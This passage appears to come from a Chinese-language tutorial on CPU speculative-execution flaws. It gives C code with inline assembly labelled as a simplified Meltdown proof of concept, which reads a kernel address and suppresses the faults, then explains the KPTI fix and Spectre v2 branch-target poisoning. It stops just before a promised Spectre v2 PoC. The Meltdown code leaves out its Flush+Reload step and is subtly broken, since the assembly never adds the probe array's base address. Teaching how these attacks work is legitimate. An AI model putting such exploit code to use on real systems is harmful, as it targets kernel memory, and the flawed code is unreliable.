#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>

// 探测数组
unsigned char probe[256 * 4096];

// 信号处理函数
void handler(int sig) {
    // 忽略异常，继续执行
}

int main() {
    // 设置信号处理
    signal(SIGSEGV, handler);
    signal(SIGBUS, handler);

    // 初始化probe数组，确保在内存中
    memset(probe, 0, sizeof(probe));

    // 尝试读取内核地址（示例：0xffffffff81000000）
    // 实际需要知道内核基址
    uint64_t kernel_addr = 0xffffffff81000000;

    // 乱序执行：读取内核地址，然后访问probe[data]
    // 由于异常，后续代码不会执行，但乱序执行可能已经完成
    asm volatile(
        "mov %1, %%rax\n"
        "mov (%%rax), %%rbx\n"   // 读取内核地址
        "shl $12, %%rbx\n"       // 乘以4096
        "mov %%rbx, %%rcx\n"
        "mov (%%rcx), %%rdx\n"   // 访问probe[data]
        :
        : "r" (kernel_addr)
        : "rax", "rbx", "rcx", "rdx"
    );

    // 通过Flush+Reload检测probe数组哪个索引被缓存
    // 这里省略检测代码
    printf("Meltdown attempt done.\n");
    return 0;
}


实际攻击需要多次尝试，并使用Flush+Reload检测缓存命中。修复：操作系统通过KPTI（内核页表隔离）将内核页表与用户态分离，使乱序执行无法访问内核内存。Intel也发布了微码更新。

Spectre v2（CVE-2017-5715）利用分支目标缓冲区（BTB）的污染来影响间接分支的预测。其原理是：CPU使用BTB来预测间接跳转（如函数指针、虚函数调用）的目标地址。攻击者可以在自己的地址空间训练BTB，使其对某个间接分支预测到攻击者控制的地址，然后当受害者执行该间接分支时，CPU会推测执行到攻击者指定的地址，从而泄露受害者内存。

漏洞成因：BTB不区分地址空间，攻击者可以影响其他进程的预测。受影响版本：Intel、AMD、ARM等支持分支预测的处理器。POC原理：攻击者与受害者共享同一物理CPU核心，攻击者通过执行一系列间接跳转来污染BTB，使得受害者进程中的某个间接分支预测到攻击者的gadget，该gadget会读取受害者内存并通过缓存侧信道泄露。

以下是一个简化的Spectre v2 POC（C语言，需在相同CPU核心上运行两个进程）：

